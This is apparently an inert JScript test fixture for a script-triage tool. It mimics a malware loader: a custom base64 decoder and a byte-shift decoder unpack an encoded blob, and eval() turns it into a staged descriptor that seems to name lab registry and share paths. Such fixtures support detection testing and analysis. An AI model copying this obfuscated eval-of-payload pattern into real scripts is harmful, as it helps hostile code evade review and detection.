// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
function decode_1d731265(SoUrCeByTeS) {
  var DeCoDeDByTeS = [];
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push((SoUrCeByTeS[i] - 21 + 256) % 256); }
  return DeCoDeDByTeS;
}
function recover_1d63c379() {
  if (true) {
    var packedText = "kDeIiXqFiDdPcDd2eIaKfod6dId6goSJejdBN4yHfol6dHt+gXo3QTd5foiFdol4fXSFh4R4eoiIN0E3fXaDeYR7e3SIeId+hYk3ckE3dnl2hYl6hzdPN2x+g12JiYVDbH6DXYmJhWd6hop6iIlDSkNGN0E3i3aBinqIN0+QN3h2goV2fnyDdH55N083eHaChXZ+fINCSkl2TEhHe3pHTTdBN4qHgTdPN32JiYWIT0RESkl2TEhHe3pHTUN6jXaChYF6Q36Di3aBfnlEeHlOTUZJTEtDeXaJN0E3ioh6h3R2fHqDiTdPN12Kg4mHeoiIYXZ3REpJdkxIR3t6R003QTd7foF6dIV2iX03TzdYT3Fxaoh6h4hxcWWKd4F+eHFxXYqDiYd6iIhhdndxcYiJdnx6QkpJdkxIR3t6R01DeXaJN0E3h3p8foiJh450hXaJfTdPN11gWGpxcWiEe4mMdod6cXFdioOJh3qIiGF2d3FxWX6IhYSIdneBenFxSkl2TEhHe3pHTTdBN4N6jYl0iIl2fHo3TzeHeoiEiod4ekKIdoKFgXpDhYhGN5JBN4iJdnx6WISKg4k3T0mS";
    var SoUrCeByTeS = decodeBase64(packedText);
    var NeUtRaL = (2 > 1) ? "left" : "right";
    var invoke = function(block, value) { return block.apply(null, [value]); };
    var DeCoDeDByTeS = invoke.apply(null, [decode_1d731265, SoUrCeByTeS]);
    var textParts = [], bi = 0;
    for (bi = 0; bi < DeCoDeDByTeS.length; bi++) { textParts.push(String.fromCharCode(DeCoDeDByTeS[bi])); }
    var DeScRiPtOrTeXt = textParts.join("");
    return DeScRiPtOrTeXt;
  }
}
function inspect_2e4e1f2d() {
  var DeScRiPtOr = eval("(" + recover_1d63c379.apply(null, []) + ")");
  var table = { steps: function() { return DeScRiPtOr.steps; }, values: function() { return DeScRiPtOr.values; } };
  return { steps: table.steps.apply(null, []), adapter: DeScRiPtOr.adapter, values: table.values.apply(null, []), stageCount: DeScRiPtOr.stageCount };
}
